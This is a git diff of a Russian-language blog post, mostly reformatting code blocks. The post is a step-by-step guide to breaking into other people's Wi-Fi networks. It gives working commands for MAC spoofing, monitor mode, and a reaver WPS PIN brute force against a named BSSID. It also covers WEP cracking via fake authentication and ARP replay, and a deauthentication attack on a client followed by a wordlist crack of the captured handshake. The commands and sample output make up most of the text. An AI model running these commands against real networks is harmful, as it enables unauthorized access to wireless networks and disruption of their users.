@@ -13,8 +13,9 @@ Summary: Рассмотрим две хитрых программы, спосо
 
 ## Меняем мак-адрес:
 
-    :::console
-    # ifconfig wlan0 hw ether 00:00:00:00:00:00
+```console
+# ifconfig wlan0 hw ether 00:00:00:00:00:00
+```
 
 где 00:00:00:00:00:00 &mdash; ваш новый MAC-адрес.
 
@@ -22,20 +23,23 @@ Summary: Рассмотрим две хитрых программы, спосо
 
 Поднимаем сеть:
 
-    :::console
-    # ifconfig wlan0 up
+```console
+# ifconfig wlan0 up
+```
 
 ## Создаём виртуальный интерфейс:
 
-    :::console
-    # airmon-ng start wlan0
+```console
+# airmon-ng start wlan0
+```
 
 Заработает виртуальный интерфейс в режиме мониторинга, как правило он носит название mon0. Теперь необходимо просканировать сеть и выбрать предполагаемую жертву, дабы получить BSSID сети.
 
-##Начинаем прослушивать эфир:
+## Начинаем прослушивать эфир:
 
-    :::console
-    # airodump-ng mon0
+```console
+# airodump-ng mon0
+```
 
 ![mon0](http://1.bp.blogspot.com/-IWElfzIH6tU/UCF15qF1ySI/AAAAAAAABJM/mn3KesP73EA/s1600/aircrack-ng.png)
 
@@ -43,9 +47,9 @@ Summary: Рассмотрим две хитрых программы, спосо
 
 Получив необходимые сведения, вписываем их вместо подчёркнутых
 
-    :::console
-    $ sudo reaver -i mon0 -b 20:4E:7F:37:73:82 --channel 1 -vv
-
+```console
+$ sudo reaver -i mon0 -b 20:4E:7F:37:73:82 --channel 1 -vv
+```
 
 * mon0 - наш виртуальный интерфейс
 * ключ -b обозначает BSSID точки доступа
@@ -56,33 +60,38 @@ Summary: Рассмотрим две хитрых программы, спосо
 
 Если всё складывается удачно, вывод должен быть примерно таким:
 
-        [+] Switching mon0 to channel 1
-        [+] Waiting for beacon from 20:4E:7F:37:73:82
-        [+] Associated with 20:4E:7F:37:73:82 (ESSID: marisha24)
-        [+] Trying pin 12345670
+```
+[+] Switching mon0 to channel 1
+[+] Waiting for beacon from 20:4E:7F:37:73:82
+[+] Associated with 20:4E:7F:37:73:82 (ESSID: marisha24)
+[+] Trying pin 12345670
+```
 
 Вот и всё. Теперь остаётся только долго ждать пока нам на блюдечке не поднесут нужные сведения. Автором сего поста был использован именно этот метод, как наиболее простой. Нижеприведённые на текущий момент носят сугубо теоретический характер.
 
-###Путь второй: продолжаем эксперименты с `aircrack-ng`
+### Путь второй: продолжаем эксперименты с `aircrack-ng`
 
-    :::console
-    # airodump-ng --channel 1 --write networks.dump mon0
+```console
+# airodump-ng --channel 1 --write networks.dump mon0
+```
 
 * где 1 - номер канала
 * networks.dump - файл, в который будет сохранён результат
 
 В другой консоли начинаем повтор ARP-пакетов:
 
-    :::console
-    # aireplay-ng --fakeauth 1 mon0 -e "linksys"
-    # aireplay-ng --arpreplay mon0 -e "linksys"
+```console
+# aireplay-ng --fakeauth 1 mon0 -e "linksys"
+# aireplay-ng --arpreplay mon0 -e "linksys"
+```
 
 * где "linksys" - ESSID (имя) сети
 
 Возможно, понадобится ввести и BSSID, в данном случае для этого служит ключ `-a`:
 
-    :::console
-    $ sudo aireplay-ng --fakeauth 1 mon0 -e dan9iekb -a FC:75:16:CC:20:D8
+```console
+$ sudo aireplay-ng --fakeauth 1 mon0 -e dan9iekb -a FC:75:16:CC:20:D8
+```
 
 и так далее
 
@@ -90,29 +99,33 @@ Summary: Рассмотрим две хитрых программы, спосо
 
 Как только наберется достаточное количество пакетов (поле DATA, 30.000 пакетов должно быть достаточно), в следующей консоли подбираем пароль:
 
-    :::console
-    # aircrack-ng networks.dump
+```console
+# aircrack-ng networks.dump
+```
 
-Ну и ждём, соответственно. Занятие это долгое, параллельно на другой машине успеете [поставить gentoo](install-gentoo.html). И не только поставить, а даже настроить =)
+Ну и ждём, соответственно. Занятие это долгое, параллельно на другой машине успеете [поставить gentoo](http://www.unix-lab.org/posts/install-gentoo/). И не только поставить, а даже настроить =)
 
 Либо ещё способ с тем же `aircrack`, опишу с нуля, дабы не запутать читателя:
 
-    :::console
-    # airodump-ng mon0 - высматриваем жертву
-    # airodump-ng -c 1 --bssid FC:75:16:CC:20:D8 -w data mon0 -  собираем данные о конкретной точке
+```console
+# airodump-ng mon0 - высматриваем жертву
+# airodump-ng -c 1 --bssid FC:75:16:CC:20:D8 -w data mon0 -  собираем данные о конкретной точке
+```
 
 Заставляем клиента переинициализироваться в сети:
 
-    :::console
-    # aireplay-ng -deauth 3 -a MAC_AP -c MAC_Client mon0
+```console
+# aireplay-ng -deauth 3 -a MAC_AP -c MAC_Client mon0
+```
 
 * где MAC_AP - ваш мак-адрес
 * MAC_Client - адрес "того парня"
 
 Способ хорош тем, что не придётся накапливать пакеты
 
-    :::console
-    # aircrack-ng -w wordlist capture_file
+```console
+# aircrack-ng -w wordlist capture_file
+```
 
 * где wordlist – ваш словарь
 * capture_file – файл с данными, с расширением cap
